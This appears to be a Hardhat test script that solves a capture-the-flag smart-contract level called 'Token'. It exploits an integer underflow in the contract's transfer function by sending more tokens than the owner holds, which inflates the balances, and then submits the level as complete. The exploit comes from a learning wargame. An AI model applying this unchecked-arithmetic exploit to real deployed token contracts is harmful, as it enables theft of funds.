import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x63bE8347A617476CA461649897238A31835a32CE";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Token", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Token");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {
        
        const initialBalance: BigNumber = await contract.balanceOf(owner.address);
        
        expect(await submitInstance(contract.address)).to.be.false;
        expect(initialBalance).to.equal(BigNumber.from(20));

        // cause an overflow
        txn = contract.transfer(attacker.address, 20);
        txn = contract.transfer(attacker.address, 20);
        
        expect(await contract.balanceOf(attacker.address)).to.be.gt(initialBalance);
        expect(await contract.balanceOf(owner.address)).to.be.gt(initialBalance);
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});